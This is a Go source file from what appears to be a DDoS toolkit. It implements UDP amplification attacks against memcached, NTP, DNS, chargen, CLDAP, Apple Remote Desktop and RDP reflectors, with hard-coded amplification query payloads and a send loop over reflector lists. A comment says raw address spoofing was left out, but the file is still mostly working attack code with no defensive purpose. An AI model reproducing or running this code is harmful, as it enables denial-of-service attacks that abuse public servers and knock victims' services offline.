package layer4

import (
	"context"
	"fmt"
	"net"

	"github.com/go-ddos-tools/pkg/core"
)

// AmplificationAttack implements UDP amplification attacks
type AmplificationAttack struct {
	Config *core.AttackConfig
	Method string
}

func NewAmplificationAttack(cfg *core.AttackConfig, method string) *AmplificationAttack {
	return &AmplificationAttack{
		Config: cfg,
		Method: method,
	}
}

func (a *AmplificationAttack) Attack(ctx context.Context) error {
	switch a.Method {
	case "MEM":
		return a.executeMEM(ctx)
	case "NTP":
		return a.executeNTP(ctx)
	case "DNS":
		return a.executeDNS(ctx)
	case "CHAR":
		return a.executeCHAR(ctx)
	case "CLDAP":
		return a.executeCLDAP(ctx)
	case "ARD":
		return a.executeARD(ctx)
	case "RDP":
		return a.executeRDP(ctx)
	default:
		return nil
	}
}

// Helper for sending amplification packets
func (a *AmplificationAttack) executeAmplification(ctx context.Context, payload []byte, port int) error {
	if len(a.Config.Reflectors) == 0 {
		return fmt.Errorf("no reflectors available")
	}

	// We use the fallback method (sending UDP to reflector) instead of raw spoofing
	// because raw spoofing requires root and is less portable.
	// The original code had both logic but this safe refactor prefers functionality over raw privileges.

	for i := 0; i < 100; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		for _, reflector := range a.Config.Reflectors {
			target := net.JoinHostPort(reflector, fmt.Sprintf("%d", port))
			addr, err := net.ResolveUDPAddr("udp", target)
			if err != nil {
				continue
			}

			conn, err := net.DialUDP("udp", nil, addr)
			if err != nil {
				continue
			}

			n, err := conn.Write(payload)
			conn.Close()

			if err == nil {
				a.Config.RequestsSent.Add(1)
				a.Config.BytesSent.Add(int64(n))
			}
		}
	}
	return nil
}

func (a *AmplificationAttack) executeMEM(ctx context.Context) error {
	payload := []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 'g', 'e', 't', 's', ' ', 'p', ' ', 'h', ' ', 'e', '\n'}
	return a.executeAmplification(ctx, payload, 11211)
}

func (a *AmplificationAttack) executeNTP(ctx context.Context) error {
	payload := []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00}
	return a.executeAmplification(ctx, payload, 123)
}

func (a *AmplificationAttack) executeDNS(ctx context.Context) error {
	payload := []byte{
		0x45, 0x67, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x73, 0x6c, 0x00,
		0x00, 0xff, 0x00, 0x01, 0x00, 0x00, 0x29, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	return a.executeAmplification(ctx, payload, 53)
}

func (a *AmplificationAttack) executeCHAR(ctx context.Context) error {
	payload := []byte{0x01}
	return a.executeAmplification(ctx, payload, 19)
}

func (a *AmplificationAttack) executeCLDAP(ctx context.Context) error {
	payload := []byte{
		0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04, 0x00, 0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00,
		0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00, 0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65,
		0x63, 0x74, 0x63, 0x6c, 0x61, 0x73, 0x73, 0x30, 0x00,
	}
	return a.executeAmplification(ctx, payload, 389)
}

func (a *AmplificationAttack) executeARD(ctx context.Context) error {
	payload := []byte{0x00, 0x14, 0x00, 0x00}
	return a.executeAmplification(ctx, payload, 3283)
}

func (a *AmplificationAttack) executeRDP(ctx context.Context) error {
	payload := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	return a.executeAmplification(ctx, payload, 3389)
}
